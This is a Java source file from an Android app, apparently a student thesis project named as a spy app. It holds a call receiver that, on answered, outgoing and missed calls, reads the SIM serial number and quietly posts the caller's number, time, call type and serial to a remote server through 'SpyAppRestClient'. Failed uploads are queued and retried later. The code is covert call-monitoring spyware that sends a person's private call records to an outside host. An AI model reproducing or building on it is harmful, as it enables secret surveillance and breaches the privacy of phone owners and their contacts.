package com.example.natalia.super_inzynierka;

import android.content.Context;
import android.telephony.TelephonyManager;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

/**
 * Created by Natalia on 27.11.2016.
 */
public class CallReceiver extends ServiceReceiver {

    private static boolean network = false;
    private static ArrayList<String> listNumber = new ArrayList<>();
    private static ArrayList<String> listDate = new ArrayList<>();
    private static ArrayList<String> listType = new ArrayList<>();
    private static ArrayList<String> listSerialNumber = new ArrayList<>();
    private static int index = 0;

    private static String serialNr = StartService.serialNr;

    @Override
    protected void onIncomingCallReceived(Context ctx, String number, Date start) {
    }

    @Override
    protected void onIncomingCallAnswered(Context ctx, String number, Date start) {
        TelephonyManager telemamanger = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        serialNr = telemamanger.getSimSerialNumber();

        String start_time = displayTime(start.getTime());
        postRequest(number, start_time, "przychodzace", serialNr);
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end) {
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, Date start) {
        TelephonyManager telemamanger = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        serialNr = telemamanger.getSimSerialNumber();

        String start_time = displayTime(start.getTime());
        postRequest(number, start_time, "wychodzace", serialNr);
    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end) {
    }

    @Override
    protected void onMissedCall(Context ctx, String number, Date start) {
        TelephonyManager telemamanger = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        serialNr = telemamanger.getSimSerialNumber();

        String start_time = displayTime(start.getTime());
        postRequest(number, start_time, "nieodebrane", serialNr);
    }

    private void postRequest(final String number, final String date, final String type, final String serialNumber) {
        RequestParams params = new RequestParams();
        params.put("number", number);
        params.put("start_time", date);
        params.put("type", type);
        params.put("log", serialNumber);
        SpyAppRestClient.post("create_connect/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                network = true;
                if (listNumber.size() > 0) {
                    for (int i = listNumber.size() - 1; i >= 0; i--) {
                        postRequest(listNumber.get(i), listDate.get(i), listType.get(i), listSerialNumber.get(i));
                        if (network) {
                            listNumber.remove(i);
                            listDate.remove(i);
                            listType.remove(i);
                            listSerialNumber.remove(i);
                            index = index - 1;
                        }
                    }
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                network = false;
                listNumber.add(index, number);
                listDate.add(index, date);
                listType.add(index, type);
                listSerialNumber.add(index, serialNumber);
                index = index + 1;
            }
        });
    }

    private String displayTime(long millis) {
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(millis);
        String min;
        String month;
        String day;
        int mYear = calendar.get(Calendar.YEAR);
        int mMonth = calendar.get(Calendar.MONTH);
        int mDay = calendar.get(Calendar.DAY_OF_MONTH);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        mMonth = mMonth + 1;

        min = Integer.toString(minute);
        if (minute < 10) min = "0" + minute;
        month = Integer.toString(mMonth);
        if (mMonth < 10) month = "0" + mMonth;
        day = Integer.toString(mDay);
        if (mDay < 10) day = "0" + mDay;

        return day + "-" + month + "-" + mYear + "  " + hour + ":" + min;
    }
}
